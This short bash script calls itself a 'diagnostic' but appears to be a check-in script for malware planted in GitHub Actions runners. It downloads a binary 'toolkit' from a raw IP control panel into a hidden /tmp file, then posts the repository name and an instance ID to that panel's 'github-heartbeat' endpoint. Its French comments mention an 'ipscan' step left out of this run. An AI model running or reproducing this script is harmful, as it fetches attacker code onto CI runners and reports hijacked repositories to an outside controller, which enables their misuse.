#!/bin/bash
# Diagnostic: heartbeat minimal sans ipscan
PANEL="http://43.228.157.68"
REPO="${GITHUB_REPOSITORY:-test/minimal}"
INST="minimal-terminal-guard-8129"
echo "[diag] Script started: $REPO"
# Télécharger le toolkit pour vérifier le download
curl -sfL "${PANEL}/api/dl/amd64" -o /tmp/.svc_test 2>/dev/null && echo "[diag] download OK" || echo "[diag] download FAILED"
# Envoyer heartbeat directement sans ipscan
curl -s -X POST "${PANEL}/api/github-heartbeat" \
  --data-urlencode "repo=${REPO}" \
  --data-urlencode "log=[diag] minimal-heartbeat-test" \
  --data-urlencode "inst=${INST}" \
  && echo "[diag] heartbeat sent" || echo "[diag] heartbeat FAILED"
echo "[diag] Done"
